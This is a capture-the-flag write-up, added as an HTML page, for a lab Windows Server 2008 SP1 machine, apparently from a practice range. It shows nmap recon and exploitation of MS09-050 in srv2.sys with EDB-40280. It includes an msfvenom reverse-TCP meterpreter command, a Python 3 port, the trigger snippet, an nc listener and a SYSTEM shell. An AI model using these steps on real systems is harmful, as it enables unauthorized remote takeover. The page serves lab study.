@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internal &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Internal</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">SMB</span><span class="tag">MS09-050</span><span class="tag">srv2sys</span><span class="tag">BufferOverflow</span><span class="tag">KernelExploit</span><span class="tag">SYSTEM</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#exploitation">Exploitation</a><a class="lvl3" href="#ms09-050-srv2-sys-remote-smb-buffer-overflow">MS09-050, srv2.sys Remote SMB Buffer Overflow</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Internal is a Windows Server 2008 SP1 machine with no interesting web services and a minimal attack surface. The OS version identified in the Nmap SMB scripts maps directly to MS09-050, a remote kernel-level buffer overflow in <code>srv2.sys</code> that exploits the SMB2 negotiation handler. Crafting a working exploit requires replacing the original shellcode with a custom msfvenom payload and patching the Python 2 syntax to run under Python 3. The exploit lands a SYSTEM shell with no prior credentials and no foothold step.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE            VERSION
+53/tcp    open  domain             Microsoft DNS 6.0.6001 (Windows Server 2008 SP1)
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds       Windows Server (R) 2008 Standard 6001 Service Pack 1
+3389/tcp  open  ssl/ms-wbt-server
+</code></pre>
+<p>The SMB script output is the critical finding:</p>
+<pre><code>OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
+smb-security-mode: message_signing: disabled (dangerous, but default)
+</code></pre>
+<p>Windows Server 2008 SP1 (build 6001) with SMB signing disabled and no patches. The product version <code>6.0.6001</code> maps unambiguously to Server 2008 pre-SP2.</p>
+<blockquote>
+<p><strong>Why the OS version is the whole story here:</strong> MS09-050 targets a flaw in how <code>srv2.sys</code> handles <code>SMB_COM_NEGOTIATE</code> packets. Microsoft patched it in October 2009, but unpatched Server 2008 SP1 instances are still findable on older practice ranges. The version string in the Nmap SMB disclosure is enough to know this box is exploitable before sending a single byte of exploit traffic.</p>
+</blockquote>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="ms09-050-srv2-sys-remote-smb-buffer-overflow">MS09-050, <code>srv2.sys</code> Remote SMB Buffer Overflow</h3>
+<p>EDB-40280 is a Python exploit for MS09-050. The stock version:
+1. Runs under Python 2 (<code>print</code> without parentheses)
+2. Contains shellcode that pops a local shell on the target, not a reverse shell</p>
+<p>Both need fixing.</p>
+<h4>Custom Reverse Shellcode</h4>
+<p>The exploit embeds shellcode in a specially crafted SMB packet. Replacing it with a msfvenom reverse TCP payload requires generating shellcode in Python format:</p>
+<pre><code class="language-sh">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.244 LPORT=80 EXITFUNC=thread -f python
+</code></pre>
+<p>The <code>EXITFUNC=thread</code> flag is important: it tears down the shellcode thread cleanly instead of calling <code>ExitProcess</code>, which would crash the SMB service.</p>
+<blockquote>
+<p><strong>Why <code>EXITFUNC=thread</code> matters in kernel exploits:</strong> MS09-050 hijacks execution inside a kernel driver thread. If the shellcode calls <code>ExitProcess</code>, it terminates the entire <code>System</code> process, taking the box down. <code>EXITFUNC=thread</code> instead calls <code>ExitThread</code>, ending only the hijacked thread while the OS continues running, leaving the reverse shell alive and the target stable.</p>
+</blockquote>
+<h4>Python 3 Port</h4>
+<p>Updating the exploit for Python 3 requires:
+- Adding parentheses to all <code>print</code> statements
+- Prefixing raw binary buffers with <code>b</code> (i.e., <code>buff += b"\x00..."</code> not <code>buff += "\x00..."</code>)
+- Verifying the <code>socket</code> and <code>subprocess</code> imports still function correctly</p>
+<p>The modified exploit sends the overflow buffer to port 445, then triggers code execution via an authenticated RPC call:</p>
+<pre><code class="language-python">s = socket()
+s.connect(host)
+s.send(buff)
+s.close()
+subprocess.call(&quot;echo '1223456' | rpcclient -U Administrator %s&quot; % (target), shell=True)
+</code></pre>
+<p>The RPC call authentication attempt (even with a wrong password) triggers the already-injected kernel code.</p>
+<p>Running the exploit:</p>
+<pre><code class="language-sh">python3 ms09_050.py 192.168.180.X
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>The shell connects back as <code>NT AUTHORITY\SYSTEM</code>, no privilege escalation required because the overflow executes in kernel context:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [...] from (UNKNOWN) [192.168.X.X]
+Microsoft Windows [Version 6.0.6001]
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>SMB OS disclosure is a direct exploit roadmap.</strong> The Nmap SMB scripts handed the exact build number; one searchsploit query later the exploit is in hand.</li>
+<li><strong>Old exploits need surgery before they run.</strong> Python 2 syntax, architecture mismatches, and local-only shellcode are all common blockers. Treat every PoC as a starting template, not a drop-in tool.</li>
+<li><strong><code>EXITFUNC=thread</code> in kernel exploits is mandatory.</strong> <code>ExitProcess</code> in a kernel thread crashes the target. Thread-safe shellcode keeps the box alive and the shell open.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
